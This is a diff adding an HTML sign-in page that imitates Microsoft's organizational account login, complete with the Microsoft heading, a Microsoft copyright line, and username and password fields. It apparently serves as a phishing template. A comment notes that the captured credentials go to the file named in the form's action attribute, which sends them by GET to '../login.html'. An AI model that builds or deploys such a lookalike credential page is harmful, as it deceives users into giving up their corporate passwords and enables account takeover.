@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign in with your account</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in with your organizational account." />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="daa.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <section class="daa-wrap">
+
+      <!-- form center container -->
+      <main class="daa-container">
+
+        <!-- logo -->
+        <div class="daa-logo">
+          <img src="daa-logo.png" alt="daa" />
+        </div>
+
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="daa-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="daa" />
+
+          <!-- default heading -->
+          <div class="daa-heading">
+            <h3>Sign in with your organizational account</h3>
+          </div>
+
+          <!-- username input -->
+          <div class="daa-input daa-username">
+            <input type="text" name="_username" placeholder="User ID or Email" value="" />
+          </div>
+
+          <!-- hidden password input -->
+          <div class="daa-input daa-password">
+            <input type="password" name="_password" placeholder="Password" value="" />
+            <a href="#"><b>Forgot password?</b></a>
+          </div>
+
+          <!-- form action button -->
+          <div class="daa-action">
+            <button type="submit">Sign in</button>
+          </div>
+
+        </form>
+
+        <!-- bottom links -->
+        <div class="daa-links">
+          <span>&copy; 2013 Microsoft</span>
+          <a href="#">Help</a>
+        </div>
+
+      </main>
+
+      <!-- side container -->
+      <aside class="daa-promo">
+        <div>
+          <p>&nbsp;</p>
+        </div>
+      </aside>
+
+    </section>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="daa.js"></script>
+
+  </body>
+</html>
